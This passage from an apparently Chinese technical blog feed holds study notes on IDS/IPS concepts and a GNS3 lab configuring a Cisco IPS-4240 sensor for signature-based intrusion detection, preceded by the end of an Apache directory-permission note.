<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Directory &apos;站点目录&apos;&gt;</span><br><span class="line">    #设定方式：代表匹配权限的顺序</span><br><span class="line">    Order Deny,Allow    //没有顺序关系：实际顺序有意义</span><br><span class="line">    #限定范围：按照顺序执行</span><br><span class="line">    Deny from 指定的范围</span><br><span class="line">    Allow from 指定范围/all</span><br><span class="line"></span><br><span class="line">    #列表显示（若无指定具体访问文件或访问文件夹）</span><br><span class="line">    Options Indexes FollowSymLinks</span><br><span class="line"></span><br><span class="line">    #指定默认访问文件</span><br><span class="line">    Directory Indexes FollowSymLinks</span><br><span class="line"></span><br><span class="line">    #指定默认访问文件</span><br><span class="line">    DirectoryIndex index.html index.php</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>▲ 一旦启用虚拟主机配置文件，那么默认的主机地址localhost就不再生效，如果想要生效就要为localhost增加单独的虚拟主机</li>
<li>▲ 如果说网站中整个网站根目录允许访问，但是其中还有其他文件夹不允许访问：可以增加多个Directory标签，针对不同的文件夹</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>IPS基础</title>
    <url>/2020/07/12/ips_base/</url>
    <content><![CDATA[<hr>
<h2 id="IPS基础"><a href="#IPS基础" class="headerlink" title="IPS基础"></a>IPS基础</h2><ul>
<li>IPS基础<ul>
<li>一个真实的蠕虫攻击</li>
<li>IDS产品</li>
<li>IPS产品</li>
<li>IPS/IDS技术发展历程</li>
<li>IPS、IDS、防火墙</li>
<li>技术介绍</li>
<li>躲避手段</li>
<li>Cisco 4240</li>
<li>实验</li>
</ul>
</li>
<li>IPS环境搭建<ul>
<li>选择GNS</li>
<li>初始化IPS</li>
<li>IME</li>
</ul>
</li>
<li>IME–IPS使用<ul>
<li>常用的网络安全设备</li>
<li>IPS -&gt; Sensor Setup</li>
<li>IPS出入流量策略</li>
<li>IPS -&gt; Interface</li>
<li>IPS -&gt; Policies</li>
</ul>
</li>
<li>IME–IDS实验<ul>
<li>IDS模拟实验</li>
<li>IDS：IPS-4240</li>
<li>R1和R2</li>
<li>SW：EtherSwitch router</li>
<li>测试连通性</li>
<li>SPAN配置</li>
<li>入侵检测</li>
</ul>
</li>
<li>IME–IPS实验<ul>
<li>IPS模拟实验</li>
<li>IPS：IPS-4240</li>
<li>R1和R2</li>
<li>SW：EtherSwitch router</li>
<li>测试连通性</li>
<li>拓扑配置</li>
<li>入侵检测</li>
</ul>
</li>
</ul>
<h3 id="0X00-IPS基础"><a href="#0X00-IPS基础" class="headerlink" title="0X00 IPS基础"></a>0X00 IPS基础</h3><h5 id="一个真实的蠕虫攻击"><a href="#一个真实的蠕虫攻击" class="headerlink" title="一个真实的蠕虫攻击"></a>一个真实的蠕虫攻击</h5><ul>
<li>扫描，发现主机</li>
<li>向目标主机发送溢出报文，控制目标机</li>
<li>获取目标机控制权</li>
<li>目标机发攻击<ul>
<li>向新受害者发起攻击，最终形成规模攻击</li>
<li>将真正攻击者隐藏，增加追查难度</li>
</ul>
</li>
<li>▲ 蠕虫病毒具有自传播性，可以感染整个内网，不同于其他的病毒</li>
</ul>
<p><img src="/images/ips/ips-notepad/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB.png" alt="蠕虫病毒攻击"></p>
<p><img src="/images/ips/ips-notepad/%E5%95%86%E4%B8%9A%E5%8C%96%E9%98%B2%E6%94%BB%E5%87%BB%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.png" alt="商业化防攻击解决方案"></p>
<h5 id="IDS产品"><a href="#IDS产品" class="headerlink" title="IDS产品"></a>IDS产品</h5><ul>
<li>IDS定义：Intrusion Detection System，入侵检测系统<ul>
<li>An intrusion detection system has the capability to <strong>detect</strong> misuse and abuse of,and unauthorized access to,netwoeked resources.</li>
</ul>
</li>
<li>IDS的两个关键特征<ul>
<li>实现应用层威胁识别，提供对网络数据的“监视功能”</li>
<li>旁路部署，与防火墙配合实现安全防范</li>
</ul>
</li>
<li>IDS优势<ul>
<li>IDS不影响网络</li>
<li>IDS的损坏不会影响到网络的功能</li>
<li>一旦超过了IDS的处理能力不会影响到网络流量，虽然这些数据不能够被IDS分析</li>
</ul>
</li>
<li>IDS问题<ul>
<li>IDS response action不能够阻止初始化包，也不能够保证阻止一个连接，IDS的响应技术能够比较好的阻止一个攻击者而不是一个攻击（Reset，Block）</li>
<li>IDS更容易受到网络逃避技术的攻击</li>
</ul>
</li>
<li><strong>注意</strong><ul>
<li>▲ IDS一般用于全流量镜像分析</li>
</ul>
</li>
</ul>
<h5 id="IPS产品"><a href="#IPS产品" class="headerlink" title="IPS产品"></a>IPS产品</h5><ul>
<li>IPS定义：Intrusion Prevention System，入侵防御系统<ul>
<li>An intrusion detection system has the capability to <strong>detect and prevent</strong> misuse and abuse of,and unauthorized access to,netwoeked resources.</li>
</ul>
</li>
<li>IPS的两个关键特征<ul>
<li>深入七层的数据流攻击特征检测<ul>
<li>蠕虫、基于Web的攻击、利用漏洞的攻击、网页篡改、木马、病毒、P2P滥用、DoS/DDoS等</li>
</ul>
</li>
<li>在线部署，实时阻断攻击</li>
</ul>
</li>
<li>IPS优势<ul>
<li>IPS deny action能够阻止触发包，后续数据包，或者所有源至于攻击者的包</li>
<li>IPS能够使用流量规范化技术，减少或者消除很多网络逃避技术</li>
<li>IPS能够有效的阻止蠕虫</li>
</ul>
</li>
<li>IPS问题<ul>
<li>IPS的错误或者损坏会影响到网络的流量</li>
<li>一旦超过了IPS的处理能力，会影响到网络的正常工作</li>
<li>IPS会影响到对时间敏感的运用程序，例如VOIP</li>
</ul>
</li>
<li>衡量IPS的标准<ul>
<li>False positive（错报）</li>
<li>False negative（漏报）</li>
</ul>
</li>
<li>⭐ IPS三种接口类型<ul>
<li>Command and Control Interface<ul>
<li>描述：带外网管口（插网线）</li>
<li>功能：需要配置IP地址，有路由能力，管理流量（https/ssh/telnet）从此接口进入</li>
</ul>
</li>
<li>Console and AUX port<ul>
<li>描述：Console AUX管理接口（插Console线）</li>
<li>功能：CLI带外管理（命令行）</li>
</ul>
</li>
<li>Monitoring（Sensor）Interfaces<ul>
<li>描述：监控接口（插网线）</li>
<li>功能：不能配置IP地址，没有路由能力，监控流量从此接口进入<ul>
<li>IPS工作模式</li>
</ul>
</li>
</ul>
</li>
<li>Promiscuous-Mode Protection：IDS</li>
<li>Inline-Mode Protection：IPS</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS--IDS%E9%83%A8%E7%BD%B2.png" alt="IPS--IDS部署"></p>
<p><img src="/images/ips/ips-notepad/IPS--IPS%E9%83%A8%E7%BD%B2.png" alt="IPS--IPS部署"></p>
<ul>
<li><strong>注意</strong>：<ul>
<li>▲ 可以单一部署IPS</li>
<li>▲ IPS可以类比于外部的AV查杀软件</li>
</ul>
</li>
</ul>
<h5 id="IPS-IDS技术发展历程"><a href="#IPS-IDS技术发展历程" class="headerlink" title="IPS/IDS技术发展历程"></a>IPS/IDS技术发展历程</h5><ul>
<li>1987年，入侵安全检测专家系统模型的提出</li>
<li>1988年，Morris蠕虫的爆发，促进了IDS开发研制</li>
<li>1990年，网络IDS–NSM（网络安全监视）用来检测所监视的广域网的网络流量的可疑行为</li>
<li>1998年，开源IDS：Snort</li>
<li>2000年，非IDS厂商提出IPS概念，并发布产品</li>
<li>2003年，主流开始使用IPS</li>
</ul>
<h5 id="IPS、IDS、防火墙"><a href="#IPS、IDS、防火墙" class="headerlink" title="IPS、IDS、防火墙"></a>IPS、IDS、防火墙</h5><ul>
<li>在网络环境中，FW、IPS一前一后部署，形成纵深的立体防御</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E4%B8%8E%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="IPS与防火墙的比较"></p>
<ul>
<li>由于IDS与生俱来的缺陷，IPS必将全面取代IDS。DPtech IPS 2000可以同时实现IPS/IDS</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E4%B8%8EIDS%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="IPS与IDS的比较"></p>
<ul>
<li>防火墙主要提供安全区域隔离、访问控制和VPN功能、不能有效检测并阻断夹杂在正常流量中的应用层攻击代码<ul>
<li>DMZ区域对外提供服务</li>
</ul>
</li>
<li>IDS由于旁路部署，侧重安全状态监控，需要和防火墙联动才能抵御威胁，适用于“事后审计”，无法满足实时安全防护</li>
<li>IPS在线部署、主动防御、实时阻断攻击</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E3%80%81IDS%E3%80%81%E9%98%B2%E7%81%AB%E5%A2%99.png" alt="IPS、IDS、防火墙"></p>
<h5 id="⭐-技术介绍"><a href="#⭐-技术介绍" class="headerlink" title="⭐ 技术介绍"></a>⭐ 技术介绍</h5><ul>
<li>Profile-Based Intrustion Detection<ul>
<li>特点：定义正常流量，其余均为非法流量</li>
<li>优点：黑客很难判断什么是合法流量，能够发现最新的还没被公布的攻击</li>
<li>缺点：很难规定正常流量，告警很难理解，错误误报很多</li>
<li>产品：主机IPS（CSA）</li>
</ul>
</li>
<li>Signature-Based Intrusion Detection<ul>
<li>特点：通过Signaure（特性代码）匹配攻击</li>
<li>优点：架构很容易，告警很容易理解，能够自定义Sig</li>
<li>缺点：不能检测未被公布的攻击，需要经常升级，需要Cache流量</li>
<li>产品：网络IPS（4215，4240….）</li>
</ul>
</li>
<li>Protocol Analysis<ul>
<li>特点：基于RFC或者安全规范监控协议</li>
<li>产品：防火墙的运用层监控</li>
</ul>
</li>
</ul>
<h5 id="⭐-躲避手段"><a href="#⭐-躲避手段" class="headerlink" title="⭐ 躲避手段"></a>⭐ 躲避手段</h5><ul>
<li>Flooding（泛洪攻击）<ul>
<li>逃避手段：制造大量超出IPS处理能力的流量，掩护非法流量穿越IPS</li>
</ul>
</li>
<li>Frametation（分片）<ul>
<li>逃避手段：制造大量分片耗尽IPS缓存，实施对IPS的DoS，掩护非法分片流量</li>
</ul>
</li>
<li>Encryption（加密）<ul>
<li>逃避手段：加密攻击流量</li>
<li>例如：通过木马控制客户端发起加密流量到攻击者</li>
</ul>
</li>
<li>Obfuscation（困惑）<ul>
<li>逃避手段：攻击者通过不同的编码方式来逃避IPS检测</li>
<li>例如：@法#轮￥功%</li>
</ul>
</li>
</ul>
<h5 id="Cisco-4240"><a href="#Cisco-4240" class="headerlink" title="Cisco 4240"></a>Cisco 4240</h5><ul>
<li>Cisco 4240正面板<ul>
<li>Cisco的IPS与防火墙外观相同，仅简介不同</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/Cisco%E6%AD%A3%E9%9D%A2%E6%9D%BF.png" alt="Cisco正面板"></p>
<ul>
<li>Cisco 4240背面板<ul>
<li>Command and Control Interface<ul>
<li>描述：带外网管口（插网线）</li>
<li>功能：需要配置IP地址，有路由能力，管理流量（https/ssh/telnet）从此接口进入</li>
</ul>
</li>
<li>Console and AUX port<ul>
<li>描述：Console AUX管理接口（插Console线）</li>
<li>功能：CLI带外管理（命令行）</li>
</ul>
</li>
<li>Monitoring（Sensor）Interfaces<ul>
<li>描述：监控接口（插网线）</li>
<li>功能：不能配置IP地址，没有路由能力，监控流量从此接口进入</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/Cisco%E8%83%8C%E9%9D%A2%E6%9D%BF.png" alt="Cisco背面板"></p>
<h5 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h5><ul>
<li>GNS3 0.8.6（傻瓜式安装）<ul>
<li>需要安装Winpcap 4.1.3</li>
<li>需要安装Wireshark 1.10.2（32bit）</li>
<li>导入ISO<ul>
<li>Edit → IOS and Hypervisors → Image file → bin文件 → save</li>
<li>导入路径不能有中文字符</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/GNS3%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="GNS3配置成功"></p>
<p><img src="/images/ips/ips-notepad/GNS%E5%AF%BC%E5%85%A5%E9%95%9C%E5%83%8F%E6%88%90%E5%8A%9F.png" alt="GNS导入镜像成功"></p>
<ul>
<li>SecureCRT_6.5.3.490（傻瓜式安装）<ul>
<li>可以自定义安装，不占C盘资源空间</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/SecureCRT%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="SecureCRT配置成功"> </p>
<ul>
<li>IPS-4240<ul>
<li>导入ova文件，设置新虚拟机位置<ul>
<li>账号：cisco</li>
<li>密码：ciscoips123</li>
</ul>
</li>
<li>网络适配器：自定义（VMnet8(NAT模式)）</li>
<li>网络适配器2：自定义VMnet2</li>
<li>网络适配器3：自定义VMnet3</li>
<li>网络适配器4：桥接模式（自动）</li>
<li>网络适配器5：桥接模式（自动）</li>
<li>新增串行端口：使用命名的管道:\.\pipe\842-1</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IPS配置成功"></p>
<ul>
<li>Piped.exe（用MFC开发）<ul>
<li>模拟IPS串行端口</li>
<li>输入Pipe和自定义Port</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/Piped%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="Piped配置成功"></p>
<ul>
<li>SecureCRT连接<ul>
<li>新建快速连接<ul>
<li>协议：Telnet</li>
<li>主机名：127.0.0.1</li>
<li>端口：在Piped自定义的Port</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/SecureCRT%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt="SecureCRT连接成功"></p>
<h3 id="0X01-IPS环境搭建"><a href="#0X01-IPS环境搭建" class="headerlink" title="0X01 IPS环境搭建"></a>0X01 IPS环境搭建</h3><h5 id="选择GNS"><a href="#选择GNS" class="headerlink" title="选择GNS"></a>选择GNS</h5><ul>
<li>GNS可以导入外部模块，但PT不行</li>
</ul>
<h5 id="初始化IPS"><a href="#初始化IPS" class="headerlink" title="初始化IPS"></a>初始化IPS</h5><ul>
<li>setup<ul>
<li>Enter host name:IPS</li>
<li>Enter IP Interface:设置VM8的IP地址以及网关</li>
<li>▲ 其他默认</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE.png" alt="IPS-4240初始化配置"></p>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IPS-4240初始化配置成功"></p>
<h5 id="IME"><a href="#IME" class="headerlink" title="IME"></a>IME</h5><ul>
<li>安装IME对密码有要求，弱口令无法登陆</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME%E8%AE%BE%E7%BD%AE%E7%AE%80%E5%8D%95%E5%AF%86%E7%A0%81%E6%8A%A5%E9%94%99.png" alt="IME设置简单密码报错"></p>
<ul>
<li>配置IME<ul>
<li>添加IPS的IP地址以及端口</li>
<li>添加IPS的账号密码</li>
<li>▲ 配置的时候，需要设置Configuration User和Event Subscription User</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME%E6%B7%BB%E5%8A%A0%E8%AE%BE%E5%A4%87.png" alt="IME添加设备"></p>
<p><img src="/images/ips/ips-notepad/IME%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IME配置成功"></p>
<p><img src="/images/ips/ips-notepad/IPS-Configuration.png" alt="IPS-Configuration"></p>
<h3 id="0X02-IME–IPS使用"><a href="#0X02-IME–IPS使用" class="headerlink" title="0X02 IME–IPS使用"></a>0X02 IME–IPS使用</h3><h5 id="常用的网络安全设备"><a href="#常用的网络安全设备" class="headerlink" title="常用的网络安全设备"></a>常用的网络安全设备</h5><ul>
<li>防火墙</li>
<li>VPN（虚拟专用网络）</li>
<li>IDS和IPS</li>
<li>杀毒软件</li>
<li>UTM（威胁管理）</li>
</ul>
<h5 id="IPS-gt-Sensor-Setup"><a href="#IPS-gt-Sensor-Setup" class="headerlink" title="IPS -&gt; Sensor Setup"></a>IPS -&gt; Sensor Setup</h5><ul>
<li>Network<ul>
<li>Allow Password Recovery：这个选项默认是开启的。用于如果忘记IPS的登陆密码。可以在IPS启机过程当中使用密码恢复功能。把IPS的密码恢复成默认的cisco.注意。这个恢复。不会影响到IPS的一些相关配置。IPS默认是不开启telnet功能的。可以通过这个面板开启。</li>
<li>LOGIN Banner：用于在登陆IPS的时候，弹出相关告警。</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Network.png" alt="IME--IPS--Network"></p>
<p><img src="/images/ips/ips-notepad/IME--IPS--Login-Banner.png" alt="IME--IPS--Login-Banner"></p>
<ul>
<li>Allowed Host/Networks：用于限制哪个台设备，或者哪个网段。可以网管这台IPS。</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Permit.png" alt="IME--IPS--Permit"></p>
<ul>
<li>Time</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Time.png" alt="IME--IPS--Time"></p>
<ul>
<li>Authentication：用于管理IPS用户帐号密码，并为某个帐号授权相应权限</li>
<li>权限等级<ul>
<li>Administrator：管理员权限。对于IPS管理和配置来说。是最高权限。可以对IPS的基本网络，网络管理，接口管理，策略管理，日志读取进行配置</li>
<li>Operator：操作者权限。可以对于IPS的策略，日志读取进行配置</li>
<li>Viewer：查看者权限。紧紧只能对IPS的日志进行读取</li>
<li>Service：IPS底层权限。IPS底层修改时使用（通过Console口连接）</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Authentication.png" alt="IME--IPS--Authentication"></p>
<h5 id="IPS出入流量策略"><a href="#IPS出入流量策略" class="headerlink" title="IPS出入流量策略"></a>IPS出入流量策略</h5><ul>
<li><p>Outbound流量</p>
<ul>
<li>IPS对于这种流量不做任何限制。也就是说。只要是路由存在的情况下。并且在IPS去往某个目的IP的过程中，没有策略拒绝这股流量的话。IPS可以抵达网络中任何一个IP主机。</li>
<li>▲ IPS进行这种通信的时候。使用的是管理接口（M口）</li>
</ul>
</li>
<li><p>Inbound流量允许</p>
<ul>
<li>已建立连接的流量（对IPS的一个回程报文，始发者是IPS）</li>
<li>源自于NTP服务器的数据包</li>
<li>Allowed Host所放行的流量。Allowed Host类似于ACL应用在VTY链路。添加条目的时候，可以针对一个主机或者一个子网</li>
</ul>
</li>
</ul>
<h5 id="IPS-gt-Interface"><a href="#IPS-gt-Interface" class="headerlink" title="IPS -&gt; Interface"></a>IPS -&gt; Interface</h5><ul>
<li>Bypass<ul>
<li>用于修改</li>
<li>三种模式<ul>
<li>AUTO：自动模式。当IPS检测引擎发生故障的时候，对于流量的监控，自动关闭。直接放行流量（默认形式）</li>
<li>ON：开启旁路模式。IPS对流量的监控直接关闭。对任何来到IPS的流量都不做检测匹配，直接放行</li>
<li>OFF：关闭旁路模式。IPS对于流量的监控是必须的。如果发生检测引擎发送故障，而IPS又使用了这个模式，那么就会对网络造成一定的影响</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Bypass.png" alt="IME--IPS--Bypass"></p>
<h5 id="IPS-gt-Policies"><a href="#IPS-gt-Policies" class="headerlink" title="IPS -&gt; Policies"></a>IPS -&gt; Policies</h5><ul>
<li>Signatures：签名。攻击特征码。IPS匹配攻击流量的关键配置。对于网络中，形形色色各种流量。都是通过Sig去配置匹配指定的一些特殊流量</li>
<li>可以针对某一条sig进行配置：<br>动作，匹配参数，enable状态，退休状态。针对某条sig.进行克隆，编辑。删除。导出。等等一系列配置</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Sig%E7%89%B9%E5%BE%81%E7%A0%81.png" alt="IME--IPS--Sig特征码"></p>
<ul>
<li>VS：虚拟传感器。可以理解为一个虚拟的IPS。一个VS内，独立关联一个接口。独立的Sig攻击库，独立的规则，独立策略。多个VS之间，关联不同的接口。使用不同的策略。针对不同流量，实现不同的动作。VS之间相互不影响（从IPS软件版本6.X开始）<ul>
<li>描述</li>
<li>关联相关的接口</li>
<li>关联相关的SIG攻击库</li>
<li>关联相关的规则</li>
<li>▲ 可以使用一个策略配置在不同的VS里面。唯独！接口不能够重复配置在其他的VS</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--VS1.png" alt="IME--IPS--VS1"></p>
<ul>
<li>Edit Actions：编辑针对某个Sig被触发后所执行的动作<ul>
<li>告警和日志行为<ul>
<li>Produce Alert–产生告警</li>
<li>Produce Verbose Alert–产生冗长告警。把触发这个Sig的数据抓包，并附在告警里</li>
<li>Log Attacker Packets–Log攻击者。对触发这条Sig的数据报文的源IP地址，在后面的一定时间内（可修改）。对其进行抓包，停止后，可以通过IDM下载这个抓包文件。使用抓包攻击打开，进行数据的分析 —-单一攻击源</li>
<li>Log Victim Packets–Log受害者。对触发这条Sig的数据报文的目的IP地址，在后面的一定时间内（可修改）对其进行抓包。停止后 —-多攻击源</li>
<li>Log Pair Packets–Log pair。对触发这条Sig的数据报文的指定的源和目的地址IP地址，在后面的一定时间内（可修改）。对其进行抓包。停止后，可以通过IDM下载这个抓包文件。使用抓包工具打开，进行数据的分析</li>
<li>Request SNMP Trap–SNMP Trap。需要指定SNMP服务器。把触发这条Sig的告警上传到指定服务器</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Edit-Actions.png" alt="IME--IPS--Edit-Actions"></p>
<h3 id="0X03-IME–IDS实验"><a href="#0X03-IME–IDS实验" class="headerlink" title="0X03 IME–IDS实验"></a>0X03 IME–IDS实验</h3><h5 id="IDS模拟实验"><a href="#IDS模拟实验" class="headerlink" title="IDS模拟实验"></a>IDS模拟实验</h5><ul>
<li>R1：Router C3700</li>
<li>R1：Router C3700</li>
<li>IDS：IPS-4240</li>
<li>SW：EtherSwitch router</li>
<li>▲ 2020.03.09 虚拟机IPS-4240的虚拟网卡VMware1和VMware2需要开启主机连接，且若在GNS3中无出现此两个网卡，可重启计算机，即可抓到这两个网卡</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%BC%80%E5%90%AF%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5.png" alt="IPS-4240开启的主机连接"></p>
<p><img src="/images/ips/ips-notepad/IDS%E6%9D%82%E5%90%88%E6%A8%A1%E5%BC%8F%E6%8A%A5%E8%AD%A6%E6%8B%93%E6%89%91%E5%9B%BE.png" alt="IDS杂合模式报警拓扑图"></p>
<h5 id="IDS：IPS-4240"><a href="#IDS：IPS-4240" class="headerlink" title="IDS：IPS-4240"></a>IDS：IPS-4240</h5><ul>
<li>改变外形：右键 -&gt; Change Symbol -&gt; ids</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; IDS</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet1</li>
</ul>
<h5 id="R1和R2"><a href="#R1和R2" class="headerlink" title="R1和R2"></a>R1和R2</h5><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>配置R1<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.1 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>配置R2<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.2 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>连通性：R1 -&gt; do ping 10.1.1.2 -&gt; R2是否联通</li>
</ul>
<h5 id="SW：EtherSwitch-router"><a href="#SW：EtherSwitch-router" class="headerlink" title="SW：EtherSwitch router"></a>SW：EtherSwitch router</h5><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; SW</li>
<li>增加接口：右键 -&gt; Slots -&gt; 增加一个NM-16ESW</li>
</ul>
<h5 id="测试连通性"><a href="#测试连通性" class="headerlink" title="测试连通性"></a>测试连通性</h5><ul>
<li>R1(f 1/0)-&gt; SW(f 1/1)</li>
<li>R2(f 1/0)-&gt; SW(f 1/2)</li>
<li>IDS -&gt; SW(f 1/15)</li>
<li>连通性：R1 -&gt; ping 10.1.1.2 -&gt; R2是否连通</li>
</ul>
<h5 id="SPAN配置"><a href="#SPAN配置" class="headerlink" title="SPAN配置"></a>SPAN配置</h5><ul>
<li>SW：EtherSwitch router<ul>
<li>monitor session 1 source interface f1/1 rx  //R1</li>
<li>monitor session 1 destination interface f1/15  //IDS</li>
</ul>
</li>
</ul>
<h5 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h5><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>IME启动IPS</li>
<li>开启Interface接口<ul>
<li>Configuration -&gt; Interface -&gt; GigabitEthernet 0/0 -&gt; Edit -&gt; enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E5%BC%80%E5%90%AFInterface%E6%8E%A5%E5%8F%A3.png" alt="IME--IDS开启Interface接口"></p>
<ul>
<li>绑定病毒特征识别库Sig0<ul>
<li>Configuration -&gt; Policies -&gt; vs0 -&gt; Edit -&gt; GigabitEthernet 0/0</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%BB%91%E5%AE%9A%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IDS绑定病毒特征识别库Sig0"></p>
<ul>
<li>配置病毒特征识别库Sig0<ul>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Change status To -&gt; Active</li>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E9%85%8D%E7%BD%AE%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IDS配置病毒特征识别库Sig0"></p>
<ul>
<li>监控IDS-ICMP事件<ul>
<li>Configuration -&gt; Sensor Monitoring -&gt; View</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%9B%91%E6%8E%A7IDS-ICMP%E4%BA%8B%E4%BB%B6.png" alt="IME--IDS监控IDS-ICMP事件"></p>
<ul>
<li>R1向R2发生ICMP Echo Requset的Ping包，查看IME–IPS的Event Viewer有无报警日志</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%9B%91%E6%8E%A7IDS%E4%BA%8B%E4%BB%B6.png" alt="IME--IDS监控IDS事件"> </p>
<h3 id="0X04-IME–IPS实验"><a href="#0X04-IME–IPS实验" class="headerlink" title="0X04 IME–IPS实验"></a>0X04 IME–IPS实验</h3><h5 id="IPS模拟实验"><a href="#IPS模拟实验" class="headerlink" title="IPS模拟实验"></a>IPS模拟实验</h5><ul>
<li>R1：Router C3700</li>
<li>R1：Router C3700</li>
<li>IDS：IPS-4240</li>
<li>SW：以太网交换机</li>
<li>▲ 2020.03.09 虚拟机IPS-4240的虚拟网卡VMware1和VMware2需要开启主机连接，且若在GNS3中无出现此两个网卡，可重启计算机，即可抓到这两个网卡</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%BC%80%E5%90%AF%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5.png" alt="IPS-4240开启的主机连接"></p>
<p><img src="/images/ips/ips-notepad/IPS%E5%9C%A8%E7%BA%BF%E6%A8%A1%E5%BC%8F%E6%8A%A5%E8%AD%A6%E6%8B%93%E6%89%91%E5%9B%BE.png" alt="IPS在线模式报警拓扑图"></p>
<h5 id="IPS：IPS-4240"><a href="#IPS：IPS-4240" class="headerlink" title="IPS：IPS-4240"></a>IPS：IPS-4240</h5><ul>
<li>改变外形：右键 -&gt; Change Symbol -&gt; ids</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; IDS</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet1</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet2</li>
</ul>
<h5 id="R1和R2-1"><a href="#R1和R2-1" class="headerlink" title="R1和R2"></a>R1和R2</h5><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>配置R1<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.1 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>配置R2<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.2 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>连通性：R1 -&gt; do ping 10.1.1.2 -&gt; R2是否联通</li>
</ul>
<h5 id="SW：Ethernet-switch"><a href="#SW：Ethernet-switch" class="headerlink" title="SW：Ethernet switch"></a>SW：Ethernet switch</h5><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; SW</li>
<li>增加接口：右键 -&gt; Slots -&gt; 增加一个NM-16ESW</li>
</ul>
<h5 id="测试连通性-1"><a href="#测试连通性-1" class="headerlink" title="测试连通性"></a>测试连通性</h5><ul>
